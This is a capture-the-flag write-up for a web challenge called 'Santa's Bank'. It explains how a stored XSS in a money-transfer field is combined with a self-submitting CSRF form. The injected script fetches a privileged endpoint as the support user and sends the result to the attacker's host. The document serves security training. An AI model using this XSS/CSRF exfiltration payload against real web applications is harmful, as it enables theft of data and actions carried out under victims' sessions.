# 14 - Santa's Bank

## Description

Level: Medium<br/>
Author: nichtseb

Santa has lost faith and trust in humanity and decided to take matters in his own hands: He opens a new bank.

He announced the release with the following message:

> For Christmas, our bank has a generous offer: save 100 € in your savings account and get a promo code!

Due to mistrust, he didn't connect his bank and its employees to the internet.

Can you hack bank?

## Solution

For this challenge we are given a web service. We can create a new account which has 0$. We need to obtain 100$ to buy
the flag and there's two main functionalities.

1. We can send money from one account to the other
2. We can send an URL to the support team which they then request (via a GET)

After experimenting for a while, I found an XSS vulnerabilitiy in the transfer function:

```
from=BA2A2625CAE55DEAD16D
to=<script>alert(123)</script>
amount=123
```

This triggers an alert in the browser. If we can get the admin to send this post request, we can get a balance of 100$.
To do this, however, we first need to find the account number of them. This could be achieved in a two-step exploit.
Instead, we can directly access the `/promotion` endpoint using the support account to obtain the flag:

```html
<form id="form" action="https://6083986c-e853-43b3-b7cf-e5e6d211c558.idocker.vuln.land//transfer" method="POST">
<input name="from" value="test" />
<input name="to" value="<script>fetch('/promotion').then(r => r.text()).then(t => location.href='http://10.13.0.0/' + t);</script>"/>
<input name="amount" value="1" />
<input type="submit" />
</form>
```

First, the admin requests my website which serves the above HTML. Then, it automatically submits the form which contains
the XSS vulnerability to run code under the same domain. This bypasses the CORS policy and fetches the flag directly.
It then sends the found flag diretly back to me. And just like that we get `HV22{XSS_XSRF_TOO_MANYS_XS}`.
